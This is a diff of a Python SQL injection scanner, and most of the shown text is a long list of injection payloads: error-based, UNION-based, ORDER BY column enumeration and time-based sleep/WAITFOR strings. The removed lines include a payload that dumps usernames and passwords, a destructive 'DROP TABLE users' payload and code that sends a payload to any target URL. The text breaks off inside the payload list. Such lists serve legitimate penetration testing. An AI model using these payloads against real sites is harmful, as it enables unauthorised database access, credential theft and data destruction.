@@ -1,37 +1,219 @@
 import requests
+import re
 
-class SQLInjectionScanner:
+class SQLInjectionVulnerabilityScanner:
     def __init__(self, url):
         self.url = url
-        self.payloads = [
-            "' OR '1'='1';--",
-            "' OR '1'='1' /*",
-            "' AND 1=2 UNION SELECT NULL, username, password FROM users --",
-            "' OR '1'='1' AND '1'='1",
-            "'; DROP TABLE users; --",
-            "' AND 1=1;--",
-            "' OR 1=1;--",
-            "' UNION SELECT NULL, database(), version(); --"
+        self.payloads = self.load_payloads()
+        self.vulnerability_signatures = [
+            "sql syntax", "you have an error", "mysql", "sql", "warning", 
+            "unclosed quotation", "the used SELECT statement", "you have an error in your SQL syntax"
         ]
+    
+    def load_payloads(self):
+        # Load various SQL injection test payloads
+        return [
+            # Generic payloads
+            "'",
+            "''",
+            "`",
+            "``",
+            ",",
+            "\"",
+            "\"\"",
+            "/", "//", "\\", "\\\\", ";",
+            "' OR \"",
+            "-- or #",
+            "' OR '1",
+            "' OR 1 -- -",
+            "\" OR \"\" = \"",
+            "\" OR 1 = 1 -- -",
+            "' OR '' = '",
+            "'='",
+            "'LIKE'",
+            "'=0--+",
+            " OR 1=1",
+            "' OR 'x'='x",
+            "' AND id IS NULL; --",
+            "'''''''''''''UNION SELECT '2",
+            "%00",
+            "/*…*/",
+            "+",  # addition, concatenate (or space in url)
+            "||",  # (double pipe) concatenate
+            "%",  # wildcard attribute indicator
+            "@variable",  # local variable
+            "@@variable",  # global variable
 
-    def check_vulnerability(self):
-        print("Available SQL Injection Payloads:")
-        for i, payload in enumerate(self.payloads):
-            print(f"{i + 1}: {payload}")
+            # Numeric payloads
+            "AND 1",
+            "AND 0",
+            "AND true",
+            "AND false",
+            "1-false",
+            "1-true",
+            "1*56",
+            "-2",
+            "1' ORDER BY 1--+",
+            "1' ORDER BY 2--+",
+            "1' ORDER BY 3--+",
+            "1' ORDER BY 1,2--+",
+            "1' ORDER BY 1,2,3--+",
+            "1' GROUP BY 1,2,--+",
+            "1' GROUP BY 1,2,3--+",
+            "' GROUP BY columnnames having 1=1 --",
+            "-1' UNION SELECT 1,2,3--+",
+            "' UNION SELECT sum(columnname ) from tablename --",
+            "-1 UNION SELECT 1 INTO @,@",
+            "-1 UNION SELECT 1 INTO @,@,@",
+            "1 AND (SELECT * FROM Users) = 1",
+            "' AND MID(VERSION(),1,1) = '5';",
+            "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
 
-        choice = int(input("Select a payload to test (1-{}): ".format(len(self.payloads))))
-        payload = self.payloads[choice - 1]
+            # Time-Based payloads
+            "(select * from (select(sleep(10)))a)",
+            "%2c(select%20*%20from%20(select(sleep(10)))a)",
+            "';WAITFOR DELAY '0:0:30'--",
 
-        response = requests.get(f"{self.url}?id={payload}")
-        if response.status_code == 200:
-            if "error" not in response.text.lower():  # Check for SQL error in response
-                print(f"Possible SQL injection vulnerability found with payload: {payload}")
-                return True
-        print("No SQL injection vulnerabilities found.")
-        return False
-
-
-if __name__ == "__main__":
-    target_url = "http://example.com/product?id=1"  # Replace with your target URL
-    scanner = SQLInjectionScanner(target_url)
-    scanner.check_vulnerability()
+            # Generic error-based payloads
+            "OR 1=1",
+            "OR 1=0",
+            "OR x=x",
+            "OR x=y",
+            "OR 1=1#",
+            "OR 1=0#",
+            "OR x=x#",
+            "OR x=y#",
+            "OR 1=1--",
+            "OR 1=0--",
+            "OR x=x--",
+            "OR x=y--",
+            "OR 3409=3409 AND ('pytW' LIKE 'pytW",
+            "OR 3409=3409 AND ('pytW' LIKE 'pytY",
+            "HAVING 1=1",
+            "HAVING 1=0",
+            "HAVING 1=1#",
+            "HAVING 1=0#",
+            "HAVING 1=1--",
+            "HAVING 1=0--",
+            "AND 1=1",
+            "AND 1=0",
+            "AND 1=1--",
+            "AND 1=0--",
+            "AND 1=1#",
+            "AND 1=0#",
+            "AND 1=1 AND '%'='",
+            "AND 1=0 AND '%'='",
+            "AND 1083=1083 AND (1427=1427",
+            "AND 7506=9091 AND (5913=5913",
+            "AND 1083=1083 AND ('1427=1427",
+            "AND 7506=9091 AND ('5913=5913",
+            "AND 7300=7300 AND 'pKlZ'='pKlZ",
+            "AND 7300=7300 AND 'pKlZ'='pKlY",
+            "AND 7300=7300 AND ('pKlZ'='pKlZ",
+            "AND 7300=7300 AND ('pKlZ'='pKlY",
+            "AS INJECTX WHERE 1=1 AND 1=1",
+            "AS INJECTX WHERE 1=1 AND 1=0",
+            "AS INJECTX WHERE 1=1 AND 1=1#",
+            "AS INJECTX WHERE 1=1 AND 1=0#",
+            "AS INJECTX WHERE 1=1 AND 1=1--",
+            "AS INJECTX WHERE 1=1 AND 1=0--",
+            "WHERE 1=1 AND 1=1",
+            "WHERE 1=1 AND 1=0",
+            "WHERE 1=1 AND 1=1#",
+            "WHERE 1=1 AND 1=0#",
+            "WHERE 1=1 AND 1=1--",
+            "WHERE 1=1 AND 1=0--",
+            "ORDER BY 1--",
+            "ORDER BY 2--",
+            "ORDER BY 3--",
+            "ORDER BY 4--",
+            "ORDER BY 5--",
+            "ORDER BY 6--",
+            "ORDER BY 7--",
+            "ORDER BY 8--",
+            "ORDER BY 9--",
+            "ORDER BY 10--",
+            "ORDER BY 11--",
+            "ORDER BY 12--",
+            "ORDER BY 13--",
+            "ORDER BY 14--",
+            "ORDER BY 15--",
+            "ORDER BY 16--",
+            "ORDER BY 17--",
+            "ORDER BY 18--",
+            "ORDER BY 19--",
+            "ORDER BY 20--",
+            "ORDER BY 21--",
+            "ORDER BY 22--",
+            "ORDER BY 23--",
+            "ORDER BY 24--",
+            "ORDER BY 25--",
+            "ORDER BY 26--",
+            "ORDER BY 27--",
+            "ORDER BY 28--",
+            "ORDER BY 29--",
+            "ORDER BY 30--",
+            "ORDER BY 31337--",
+            "ORDER BY 1#",
+            "ORDER BY 2#",
+            "ORDER BY 3#",
+            "ORDER BY 4#",
+            "ORDER BY 5#",
+            "ORDER BY 6#",
+            "ORDER BY 7#",
+            "ORDER BY 8#",
+            "ORDER BY 9#",
+            "ORDER BY 10#",
+            "ORDER BY 11#",
+            "ORDER BY 12#",
+            "ORDER BY 13#",
+            "ORDER BY 14#",
+            "ORDER BY 15#",
+            "ORDER BY 16#",
+            "ORDER BY 17#",
+            "ORDER BY 18#",
+            "ORDER BY 19#",
+            "ORDER BY 20#",
+            "ORDER BY 21#",
+            "ORDER BY 22#",
+            "ORDER BY 23#",
+            "ORDER BY 24#",
+            "ORDER BY 25#",
+            "ORDER BY 26#",
+            "ORDER BY 27#",
+            "ORDER BY 28#",
+            "ORDER BY 29#",
+            "ORDER BY 30#",
+            "ORDER BY 31337#",
+            "ORDER BY 1",
+            "ORDER BY 2",
+            "ORDER BY 3",
+            "ORDER BY 4",
+            "ORDER BY 5",
+            "ORDER BY 6",
+            "ORDER BY 7",
+            "ORDER BY 8",
+            "ORDER BY 9",
+            "ORDER BY 10",
+            "ORDER BY 11",
+            "ORDER BY 12",
+            "ORDER BY 13",
+            "ORDER BY 14",
+            "ORDER BY 15",
+            "ORDER BY 16",
+            "ORDER BY 17",
+            "ORDER BY 18",
+            "ORDER BY 19",
+            "ORDER BY 20",
+            "ORDER BY 21",
+            "ORDER BY 22",
+            "ORDER BY 23",
+            "ORDER BY 24",
+            "ORDER BY 25",
+            "ORDER BY 26",
+            "ORDER BY 27",
+            "ORDER BY 28",
+            "ORDER BY 29",
+            "ORDER BY 30",
+            "ORDER BY 31337",
+            "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND '
